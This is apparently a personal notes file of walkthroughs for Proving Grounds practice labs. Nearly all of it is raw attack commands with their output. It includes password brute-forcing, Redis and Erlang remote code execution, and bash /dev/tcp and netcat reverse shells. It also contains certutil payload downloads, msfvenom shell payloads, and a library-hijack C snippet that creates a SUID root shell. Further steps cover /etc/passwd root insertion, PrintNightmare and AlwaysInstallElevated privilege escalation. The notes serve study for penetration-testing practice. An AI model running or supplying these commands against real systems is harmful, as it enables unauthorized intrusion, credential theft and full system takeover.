wfuzz -c -w /opt/rockyou.txt  -d "user=pablo&password=FUZZ&csrf_token=4eebfd56d8bd8d6996132ec9f0e2c7783a11b3b2&submit=Login" --hc 404 -H "Cookie: PHPSESSID=5p31dkg2dufihk71earbroovhp" -u http://192.168.104.93/login -t 50 --hh 3129 --zP count=False
	https://github.com/xmendez/wfuzz/issues/229
	--zP count=False
	#bruteforec login hydra
hydra -l pablo -P /opt/rockyou.txt 192.168.104.93 http-post-form '/login:user=^USER^&password=^PASS^&csrf_token=4eebfd56d8bd8d6996132ec9f0e2c7783a11b3b2&submit=Login:mismatch:H=Cookie\: PHPSESSID=5p31dkg2dufihk71earbroovhp'
hydra -l pablo -P /opt/rockyou.txt -e nsr 192.168.104.93 ssh
	#enumerate redis
redis-cli -h 192.168.104.93
>nfo keyspace
	# Keyspace
	#no database exist, I though there will be databse on user login
>config set dir /var/www/html/
>config set dbfilename rce.php
>set test "<?php phpinfo(); ?>"
>save
	(error) ERR
	#www not writable
>config set dir /home/pablo
>config set dir /home/pablo/.ssh/
	(error) ERR
	#directory pablo exist but no .ssh directory
>config set dir /var/lib/redis/.ssh
	(error) ERR
	#no home directory for redis also, means redis running not as default redis user
>info server
	redis_version:5.0.9
	#the version is match as wombo pg practice, try to exploit it but failed
python3 redis-master.py -r 192.168.104.93 -p 6379 -L 192.168.49.104 -P 6379 -f RedisModulesSDK/exp.so -c "id"
	receive data: b'-ERR Error loading the extension. Please check the server logs.\r\n'
	#after read writeup I realize that config dir are not writable
	#so when I change config dir to writable, i'm able to execute without upload via ftp
redis-cli -h 192.168.104.93
>config set dir /var/ftp/pub
	OK
cd ../wombo/redis-rogue-getshell
python3 redis-master.py -r 192.168.104.93 -p 6379 -L 192.168.49.104 -P 6379 -f RedisModulesSDK/exp.so -c "id"
	uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
python3 redis-master.py -r 192.168.104.93 -p 6379 -L 192.168.49.104 -P 6379 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.49.104/80 0>&1'"
	#in this case we can load module that uploaded via ftp
ftp -p 192.168.104.93
>cd pub
>put exp.so
	226 Transfer complete.
	#ftp pub directory in /var/ftp/pub
	#https://www.linuxquestions.org/questions/red-hat-31/direct-access-on-pub-directory-for-anonymous-user-on-ftp-server-4175504168/
redis-cli -h 192.168.104.93
>config set dir /var/ftp/pub
>MODULE LOAD /var/ftp/pub/exp.so
>system.exec "id"
	"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
	#redis reverse shell
>system.exec "bash -c 'bash -i >& /dev/tcp/192.168.49.104/80 0>&1'"
>system.rev 192.168.49.104 80
nc -lvp 80
>whoami
	pablo
	#create ssh key
>mkdir .ssh
ssh-keygen
>echo "ssh-rsa ...." > authorized_keys
>chmod 700 .ssh
>chmod 600 authorized_keys
ssh -i pablo pablo@192.168.104.93
	#dynamic library hijack, almost like malbec pg practice
>bash linpeas.sh | tee pablo-sybaris-linpeas.txt
>cat /etc/crontab
	LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
	  *  *  *  *  * root       /usr/bin/log-sweeper
>/usr/bin/log-sweeper
	/usr/bin/log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
	#so there is missing object that we can hijack, and on crontab there is LD_LIBRARY_PATH variable that we has write access
>find / -writable 2>/dev/null | grep usr
	/usr/local/lib/dev
	#and yup we has write access to LD path
>cat lib.c
	#include <stdio.h>
	#include <stdlib.h>
	static void hijack() __attribute__((constructor));
	void hijack() {
	setuid(0);
	system("/usr/bin/cp /bin/bash /tmp/rootbash");
	system("/usr/bin/chmod +s /tmp/rootbash");}
>gcc -shared -fPIC -o utils.so lib.c
>cp utils.so /usr/local/lib/dev/
>/tmp/rootbash -p
#echo "rooot:z3Y6fq9si1hCQ:0:0:root:/root:/bin/bash" >> /etc/passwd
>su rooot
#whoami
	root








Pelican ProvingGrounds
======================================
sudo autorecon 192.168.131.98
cat fullnmap
	22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	631/tcp   open  ipp         CUPS 2.2
	2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
	2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	8080/tcp  open  http        Jetty 1.0
	8081/tcp  open  http        nginx 1.14.2
	44091/tcp open  java-rmi    Java RMI
cat tcp_44091_rmi_nmap.txt
	rmi-vuln-classloader:
	|   VULNERABLE:
	|   RMI registry default configuration remote code execution vulnerability
	|     State: VULNERABLE
	#rmi vulnerable but I put this last
http://192.168.131.98:8080/exhibitor/v1/ui/index.html
	Exhibitor for ZooKeeper
searchsploit exhibitor                                                                                                                                                                   130 ⨯
	Exhibitor Web UI 1.7.1 - Remote Code Execution		| java/webapps/48654.txt
	#so the exploit said on exhibitor zookeper doesn't sanitize java.env script
	#so I can put rce inside $(id) and `id` on java.env script, I use payload same as exploit to get reverse shell
http://192.168.131.98:8080/exhibitor/v1/ui/index.html
	$(/bin/nc -e /bin/bash 192.168.49.131 445 &)
nc -lvp 445
>whoami
	charles
>sudo -l
	(ALL) NOPASSWD: /usr/bin/gcore
	#so gcore can dump running process to get string content, keys, or password
	#I can dump process owned by root, gcore privesc
>ps -aux
	root       493  0.0  0.0   2276   108 ?        Ss   06:23   0:00 /usr/bin/password-store
>sudo gcore -a 493
>strings core.493
	...
	001 Password: root:
	ClogKingpinInning731
>su root
#whoami
	root










Clyde ProvingGrounds
========================================
sudo autorecon 192.168.131.68
cat fullnmap
	21/tcp    open   ftp        vsftpd 3.0.3
	22/tcp    open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
	80/tcp    open   http       Apache httpd 2.4.25 ((Debian))
	4369/tcp  open   epmd       Erlang Port Mapper Daemon
	15672/tcp open   http       Cowboy httpd
	65000/tcp open   unknown
ftp -p 192.168.131.68
>dir
>pwd
	257 "/var/lib" is the current directory
	#ftp run in / directory
>cd /var/www/html
>dir
	drwxr-xr-x   12 ftp      ftp          4096 Apr 24  2020 php4dvd
>get config.php
cat config.php
	$settings["db"]["user"] = "php4dvd";
	$settings["db"]["pass"] = "ef811d218ed9e3391ebf4f04915dd215";
http://192.168.131.68/php4dvd
	#can login as admin:admin
	#tri to dvd4exploit but failed, there is no install directory /php4dvd/install/?go=configuration
	#https://packetstormsecurity.com/files/121835/PHP4DVD-2.0-Code-Injection.html
http://192.168.131.68//php4dvd/install/?go=configuration
	#pentesting erlang port 4369
	#https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd
echo -n -e "\x00\x01\x6e" | nc -vn 192.168.131.68 4369
	name rabbit at port 65000
sudo apt-get install erlang
erl
>net_adm:names('192.168.131.68').
	{ok,[{"rabbit",65000}]}
	#rce erlang cookie
	#first I has to find .erlang.cookie
ftp -p 192.168.131.68
>dir
	drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 rabbitmq
>cd rabbit mq
>ls -la
	-r--------    1 ftp      ftp            20 Apr 24  2020 .erlang.cookie
>get .erlang.cookie
cat .erlang.cookie
	JPCGJCAEWHPKKPBXBYYB
	#follow this blogpost
	#https://securityboulevard.com/2018/09/erlang-authenticated-remote-code-execution/
sudo cp .erlang.cookie ~/
cat /etc/hosts
	192.168.131.68  clyde
erl -sname test
>net_kernel:connect('rabbit@192.168.131.68').
	** exception error: undefined function net_kernel:connect/1
>net_kernel:connect_node('rabbit@clyde').
	true
>erlang:spawn('rabbit@clyde',os,cmd,["whoami"]).
	<9200.4412.0>
	#success but no output
>erlang:spawn('rabbit@clyde',os,cmd,["nc 192.168.49.131 80"]).
	<9200.4437.0>
	#no nc binary (?)
>erlang:spawn('rabbit@clyde',os,cmd,["wget 192.168.49.131"]).
	<9200.4458.0>
nc -lvp 80
	GET / HTTP/1.1
	User-Agent: Wget/1.18 (linux-gnu)
	#got code execution
	#erlang reverse shell
>erlang:spawn('rabbit@clyde',os,cmd,["bash -c 'bash -i >& /dev/tcp/192.168.49.131/80 0>&1'"]).
nc -lvp 80
>whoami
	rabbitmq
	#after read writeup I can do with existing exploit
	#https://www.exploit-db.com/exploits/49418
cat 49418.py
	TARGET = "192.168.120.107"
	PORT = 65000
	COOKIE = "JPCGJCAEWHPKKPBXBYYB"
	CMD = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.118.6\",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
nc -lvp 80
>whoami
	rabbitmq
>bash linpeas.sh | tee rabbitmq-clyde-linpeas.txt
>find / -perm -4000 2>/dev/null | xargs ls -laht
	-rwsr-xr-x 1 root root       2.8M Dec 21  2016 /usr/bin/nmap
	#nmap privsec limited suid debian, follow exact like gtfobin
>TF=$(mktemp)
>echo 'os.execute("/bin/sh")' > $TF
>nmap --script=$TF
	#another way
>echo 'os.execute("/bin/sh")' > ex.nse
>nmap --script ex.nse
#whoami
	root









Jacko ProvingGrounds
==================================
sudo autorecon 192.168.187.66
sudo nmap -p- 192.168.187.66 --open -Pn -sV -oN fullnmap
cat fullnmap
	80/tcp   open  http          Microsoft IIS httpd 10.0
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	8082/tcp open  http          H2 database http console
http://192.168.187.66/html/main.html
	H2 Databse Website Documentation
http://192.168.187.66:8082/login.do
	H2 Database Console
	#login default user sa and no password
	#https://stackoverflow.com/questions/8695420/what-is-the-default-username-and-password-for-h2-when-theres-nothing-explicit-i
searchsploit h2 database
	H2 Database 1.4.199 - JNI Code Execution		| java/local/49384.txt
	#exploit H2 Databse RCE, I follow on exploid says
	#go to console and query same order as exploit 49384.txt
http://192.168.187.66:8082/login.do?jsessionid=855f04de7b747a2ef424fdfebd787d2a
	SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),......R(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');
	CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
	CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
	CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
	#got code execution, now reverse shell
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("ping 192.168.49.187").getInputStream()).useDelimiter("\\Z").next()');
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.49.187/rshell.exe c:/windows/temp/rshell.exe").getInputStream()).useDelimiter("\\Z").next()');
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:/windows/temp/rshell.exe").getInputStream()).useDelimiter("\\Z").next()');
rlwrap nc -lvp 80
>whoami
	'whoami' is not recognized as an internal or external command
>echo %PATH%
	C:\Users\tony\AppData\Local\Microsoft\WindowsApps;
	#look like path are not exported
	#export path windows
>set PATH=C:\Windows\System32;C:\Windows\SysWOW64;%PATH%
>set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\SysWOW64;%PATH%
>whoami
	jacko\tony
>whoami /priv
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled
>systeminfo
	OS Name:                   Microsoft Windows 10 Pro
	OS Version:                10.0.18363 N/A Build 18363
	#seimpersonate windows 10 pro with PrintSpoofer
	#I tried with juicypotato like jeeves, bart, conceal but failed
impacket-smbserver asd . -smb2support
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.187 LPORT=80 -f exe > rshell.exe
>PrintSpoofer.exe -i -c "C:\temp\rshell.exe"
rlwrap nc -lvp 80
>whoami
	nt authority\system
	#print nightmare windows 10 pro
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.187 LPORT=80 -f dll > rev.dll
>SharpPrintNightmare.exe C:\temp\rev.dll
rlwrap nc -lvp 80
>whoami
	nt authority\system
	#and again that was no the itended path
	#exploit PaperStream IP
	#https://www.exploit-db.com/exploits/49382
searchsploit 49382
		PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalatio 		| windows/local/49382.ps1
>dir "C:\Program Files (x86)"
	04/27/2020  08:01 PM    <DIR>          PaperStream IP
>type "C:\Program Files (x86)\PaperStream IP\TWAIN\readmeenu.rtf"
	PaperStream IP driver 1.42\par
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.187 LPORT=80 -f dll -o UninOldIS.dll
	#important note that when exploit program x86, dont use payload platform  msfvenom -p windows/x64/shell_reverse_tcp
	#because when I use -p windows/x64/shell_reverse_tcp exploit failed
>cd windows\temp
impacket-smbserver asd . -smb2support
>copy \\192.168.49.187\asd\UninOldIS.dll .
>copy \\192.168.49.187\asd\49382.ps1 .
>\Windows\System32\WindowsPowershell\v1.0\powershell.exe
>. .\49382.ps1
>whoami
	nt authority\system








Internal ProvingGrounds
=====================================
sudo autorecon 192.168.96.40
cat fullnmap
	53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp  open  ssl/ms-wbt-server?
	5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
cat tcp_445_smb_nmap.txt
	smb-vuln-ms17-010:
	|   VULNERABLE:
	|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
	#I though will be easy eternalblue. but I failed to get reverse shell back even with metasploit
	#openup someone writeup, found out that that was not the way in
sudo nmap -p 445 --script=vuln,discovery -Pn 192.168.211.40
	smb-vuln-cve2009-3103:
	|   VULNERABLE:
	|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
	#exploit ms09-050
msfconsole
>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
>set rhost 192.168.211.40
>set lhost 192.168.49.211
>set lport 445
>run
>whoami
	nt authority\system
	#manual exploit
msfvenom -l payload | grep meterpreter
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.151 LPORT=445  EXITFUNC=thread  -f c
python 40280.py 192.168.96.40
>whoami
	nt authority\system
	#someone actually manage to exploit eternalblue and success
crackmapexec smb 192.168.96.40 -u guest -p guest
SMB		192.168.96.40   445    INTERNAL		[*] Windows Server (R) 2008 Standard 6001 Service Pack 1 (name:INTERNAL) (domain:internal) (signing:False) (SMBv1:True)
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.96 LPORT=445 EXITFUNC=thread -f raw -o rshell.bin
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.96 LPORT=445 EXITFUNC=thread -f raw -o rshell.bin
python 42031.py 192.168.96.40 rshell.bin
>whoami
	nt authority\system







Webcall Proving Grounds
========================================
sudo autorecon 192.168.96.37
cat fullnmap
	21/tcp open  ftp     Pure-FTPd
	22/tcp open  ssh     OpenSSH 5.8p1 Debian 7ubuntu1 (Ubuntu Linux; protocol 2.0)
	25/tcp open  smtp    Postfix smtpd
	53/tcp open  domain  ISC BIND 9.7.3
	80/tcp open  http    Apache httpd 2.2.20 ((Ubuntu))
ftp -p 192.168.96.37
	#failed login
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/Names/names.txt -t 192.168.70.137 -p 25 -m 5 -w 20 
cat tcp_80_http_dirb.txt
	==> DIRECTORY: http://192.168.96.37:80/webcalendar/
http://192.168.96.37/webcalendar
	#set proxy hydra
hydra -l admin -P /opt/rockyou.txt 192.168.96.37 http-post-form '/webcalendar/login.php:login=^USER^&password=^PASS^&remember=yes:F=Invalid'
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
unset HYDRA_PROXY_HTTP
	#exploit webcalendar 
searchploit webcalendar
	WebCalendar 1.2.4 - Remote Code Execution		| php/webapps/18775.php
php 18775.php 192.168.96.37 /webcalendar/
>id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
>bash -c "bash -i >& /dev/tcp/192.168.49.96/80 0>&1"
	#manual call
GET /webcalendar/includes/settings.php HTTP/1.0
Host: 192.168.96.37
Cmd: aWQ=
	____uid=33(www-data) gid=33(www-data) groups=33(www-data)
>find . | grep config
>cat includes/config.php
>cat /var/www/webcalendar/includes/settings.php
	db_database: intranet
	db_login: wc
	db_password: edjfbxMT7KKo2PPC
>mysql -u wc -p
>use intranet
>describe webcal_user;
>select cal_login,cal_passwd,cal_is_admin from webcal_user;
	admin:cbb44d79209bee5af34457c3fafd4f1d
>update webcal_user set cal_passwd = 'a3dcb4d229de6fde0db5686dee47145d' where cal_login='admin';
	#exploit kernel Ubuntu 3.0
>uname -a
	Linux version 3.0.0-12-server (buildd@crested) #20-Ubuntu SMP Fri....
>./linux-exploit-suggester-2.pl
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] memodipper
      CVE-2012-0056
      Source: http://www.exploit-db.com/exploits/18411
>gcc -pthread 40839.c -o dcow -lcrypt
>chmod a+x dcow
>./dcow asd
	#and fucking crash
wget https://www.exploit-db.com/download/40616
mv 40616 cowroot.c
>gcc cowroot.c -o cowroot -pthread
>./cowroot
	#no result
	#the thing I hate about kernel exploit is the box is crash if exploit failed
	#and exploit suggester doesn't give good sorting
	#lesson learned that combine exploit suggester and searchsploit to find kernel exploit
searchsploit ubuntu 3.0
	Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)	| linux/local/18411.c
searchsploit -m 18411
>gcc 18411.c -o ex
>./ex
	....
	[+] Executing su with shellcode.
#id
#whoami
	root







HelpDesk ProvingGrounds
======================================
sudo autorecon 192.168.96.43
cat fullnmap
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp open  ms-wbt-server Microsoft Terminal Service
	8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
crackmapexec smb 192.168.96.43 -u guest -p guest
	[*] Windows Server (R) 2008 Standard 6001 Service Pack 1 (name:HELPDESK)
	#vulnerable to ms17-10 and CVE-2009-3103 but need metasploit
http://192.168.96.43:8080/
	ManageEngine ServiceDesk 7.6.0
	#default user are administrator:administrator and guest:guest
searchsploit manageengine servicedesk
	ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection		| jsp/webapps/11793.txt
	#manage to use this exploit with sqli but failed,
http://192.168.96.43:8080/WorkOrder.do
	#first I need to add value so there will be something to query
http://192.168.96.43:8080/WorkOrder.do?woMode=viewWO&woID=1); EXEC xp_cmdshell 'net user moebius m03biu5inj3ct$ /add';--
	#failed got response 500 error jsp
	#exploit manage engine service desk 7.6.0
	#https://packetstormsecurity.com/files/129806/ManageEngine-Shell-Upload-Directory-Traversal.html
	#https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py
	#vulnerability in file upload and directory traversal, so will upload war file to tomcat directory application
msfvenom -l payload | grep java
msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.96 LPORT=3389 -f war > shell2.war
	#need to change java payload to make exploit works and that is the worked one
wget https://github.com/PeterSufliarsky/exploits/raw/master/CVE-2014-5301.py
cat CVE-2014-5301.py
	....
    proxies = {'http': 'http://127.0.0.1:8080'}
    s = requests.Session()
    s.proxies.update(proxies)
python3 CVE-2014-5301.py 192.168.96.43 8080 administrator administrator shell2.war
rlwrao nc -lvp 3389
>whoami
	nt authority\system
	#exploit CVE-2009-3103 without metasploit
crackmapexec smb 192.168.96.43 -u guest -p guest
	[*] Windows Server (R) 2008 Standard 6001 Service Pack 1 (name:HELPDESK)
searchsploit -m 40280
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.96 LPORT=3389  -f c
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.96 LPORT=3389 EXITFUNC=thread  -f c
msfconsole
>use exploit/multi/handler
>set payload windows/shell/reverse_tcp
>run
python 40280.py 192.168.96.43
>whoami
	nt authority\system











Vector profingground
=======================================
sudo autorecon 192.168.96.119
sudo nmap -p- 192.168.96.119 --open -Pn -sV -oN fullnmap
cat fullnmap
	21/tcp   open  ftp           Microsoft ftpd
	80/tcp   open  http          Microsoft IIS httpd 10.0
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
	2290/tcp open  http          Microsoft IIS httpd 10.0
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
http://192.168.96.119/
http://192.168.96.119:2290/
	AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488
	Victor's TODO: Need to add authentication eventually..
	#got username victor and some pkcs7 idk what that was
	#searching up online "AES-256-CBC-PKCS7" and "padding oracle attack on aes-256-cbc-pkcs7" somehow endup in this github repo
	#https://github.com/mpgn/Padding-oracle-attack
	#and the exploit run in port 80
http://192.168.96.119:2290/?c=asdasdasd
	....
	<span id="MyLabel">0</span>
http://192.168.96.119:2290/?c=4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488
	...
	<span id="MyLabel">1</span>
	#somewho if key valid return 1 and doen't valid return 0
	#change exploit to run port 2290
cat 2exploit.py
	...
	conn = http.client.HTTPConnection(host,2290)
python3 2exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.96.119 -u '/Default.aspx?c=' -v --error ">0<"
	[+] Decrypted value (HEX): 576F726D416C6F655661743704040404
	[+] Decrypted value (ASCII): WormAloeVat7
	#idk what was happen but I got value looks like password
crackmapexec smb 192.168.96.119 -u victor -p WormAloeVat7
	SMB         192.168.96.119  445    VECTOR           [*] Windows Server 2019 Standard 17763 x64 (name:VECTOR) (domain:vector) (signing:False) (SMBv1:True)
	SMB         192.168.96.119  445    VECTOR           [+] vector\victor:WormAloeVat7
smbmap -H 192.168.96.119 -u victor -p WormAloeVat7
	IPC$                                                    READ ONLY       Remote IPC
rdesktop -u victor -p WormAloeVat7 192.168.96.119
	#print nightmare privesc
>systeminfo
	OS Name:		Microsoft Windows Server 2019 Standard
	OS Version:		10.0.17763 N/A Build 17763
>SharpPrintNightmare.exe C:\Windows\temp\rev.dll
	...cannot start or run due to incompatibility....Not Valid application
	#but that was x64 bit (?), then I user powershell
>Powershell
>Import-Module .\CVE-2021-1675.ps1
>Invoke-Nightmare -NewUser asd -NewPassword Password123!
>net user asd
	Local Group Memberships      *Administrators
crackmapexec smb 192.168.96.119 -u asd -p Password123!
	SMB         192.168.96.119  445    VECTOR           [+] vector\asd:Password123!
rdesktop -u asd -p Password123! 192.168.96.119
>run cmd as administrator
>net user Administrator Password123!
crackmapexec winrm 192.168.96.119 -u Administrator -p Password123!
	WINRM       192.168.96.119  5985   NONE             [+] None\Administrator:Password123! (Pwn3d!)
psexec.py 'Administrator:Password123!@192.168.96.119'
>whoami
	nt authority\system
	#the itended way, since I can run winpeas its really hard to enumeration
wget https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1
>. .\PrivescCheck.ps1
>Invoke-privescCheck
	#got nothing then I read walktrough
type Downloads\backup.rar
	Rar!
>copy \users\victor\download\backup.rar \FTPRoot\
ftp -p 192.168.96.119
>get backup.rar
unrar e backup.rar
	Password:WormAloeVat7
cat backup.txt | base64 -d
	Administrator:EverywayLabelWrap375
psexec.py 'Administrator:EverywayLabelWrap375@192.168.96.119'
>whoami
	nt authority\system






Shenzi ProvingGrounds
=====================================
sudo autorecon 192.168.96.55
sudo nmap -p- 192.168.96.55 --open -Pn -sV -oN fullnmap
cat fullnmap
	21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
	80/tcp   open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	443/tcp  open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
	445/tcp  open  microsoft-ds?
	3306/tcp open  mysql?
	5040/tcp open  unknown
smbclient \\\\192.168.65.55\\shenzi
>mget *
cat password.txt
	5) WordPress:
		User: admin
		Password: FeltHeadwallWight357
	#there are some user password in text and only webserver left to enumerate
crackmapexec smb 192.168.96.55 -u user.txt -p pass.txt --continue-on-success
	#got some result but no write access, just like anonymous user
https://192.168.96.55/dashboard/
http://192.168.96.55/dashboard/
	#same web service
gobuster dir -u http://192.168.96.55/dashboard -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400 -x .php,.html,.txt
gobuster dir -u http://192.168.96.55/ -w /opt/directory-list-lowercase-2.3-medium.txt --timeout 100s -t 50 -b 404,400
	#dirbuster everywhere but got nothing, open up hint there are wordpress with guessing path (?)
http://192.168.96.55/shenzi/
	Wordpress
	#finally find it, login admin:FeltHeadwallWight357 and upload webshell
http://192.168.96.55/shenzi/wp-content/themes/twentyseventeen/404.php
	copy \\192.168.49.96\asd\rshell.exe
	rshell.exe
rlwrap nc -lvp 80
>whoami
	shenzi\shenzi
>systeminfo
	OS Name:                   Microsoft Windows 10 Pro
	OS Version:                10.0.18363 N/A Build 18363
	#shaprprint nightmare privesc
>Get-Service -Name Spooler
	Status   Name               DisplayName
	------   ----               -----------
	Running  Spooler            Print Spooler
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f dll -o rev.dll
>SharpPrintNightmare.exe C:\temp\rev.dll
rlwrap nc -lvp 80
>whoami
	nt authority\system
	#and ofc that was not the itended path
>whoami
	shenzi\shenzi
>winpeas.exe > shenzi-winpeas.txt
	AlwaysInstallElevated set to 1 in HKLM!
	AlwaysInstallElevated set to 1 in HKCU!
	#alwaysinstallelevated privesc
>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	AlwaysInstallElevated    REG_DWORD    0x1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f msi -o rev.msi
>msiexec /quiet /qn /i rev.msi
rlwrap nc -lvp 80
>whoami
	nt authority\system








Hutch provingGrounds
=========================================
sudo autorecon 192.168.96.122
sudo nmap -p- 192.168.96.122 --open -Pn -sV -oN fullnmap
cat fullnmap
	53/tcp    open  domain        Simple DNS Plus
	80/tcp    open  http          Microsoft IIS httpd 10.0
	88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-23 12:49:25Z)
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds?
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	#look like will pentesting AD and domain revealed as hutch.offsec
/opt/kerbrute userenum -d hutch.offsec --dc hutch.offsec /opt/user.txt
/opt/kerbrute userenum -d hutch.offsec --dc hutch.offsec /opt/SecLists/Usernames/Names/names.txt
GetADUsers.py -all -no-pass -dc-ip 192.168.96.122 hutch.offsec/
		Name                  Email                           PasswordLastSet      LastLogon
	--------------------  ------------------------------  -------------------  -------------------
	...
	fmcsorley                                             2020-11-04 00:35:05.815275  2021-11-23 09:05:45.718299
	#got list of users, and only user fmsorley are logged in
GetNPUsers.py -userfile /opt/user.txt --dc-ip 192.168.96.122 hutch.offsec/
ldapsearch -h 192.168.96.122 -x -s base namingcontexts
ldapsearch -h 192.168.96.122 -x -b "DC=hutch,DC=offsec" > ldap-anonymous.txt
ldapsearch -h 192.168.96.122 -x -b "DC=hutch,DC=offsec" 'objectClass=*'> ldap-objectclass.txt
cat ldap-anonymous.txt | grep sAMAccountName | cut -d ' ' -f2,3,4 >	user.txt
	#got user list
/opt/kerbrute userenum -d hutch.offsec --dc hutch.offsec user.txt
	#all user are valid
GetNPUsers.py -usersfile user.txt -no-pass -dc-ip 192.168.96.122 hutch.offsec/
	#look closely user fmsorley
cat ldap-anonymous.txt
cat ldap-anonymous.txt | grep -i pass
	...
	description: Password set to CrabSharkJellyfish192 at user's request. Please c
	#found credz fmsorley:CrabSharkJellyfish192
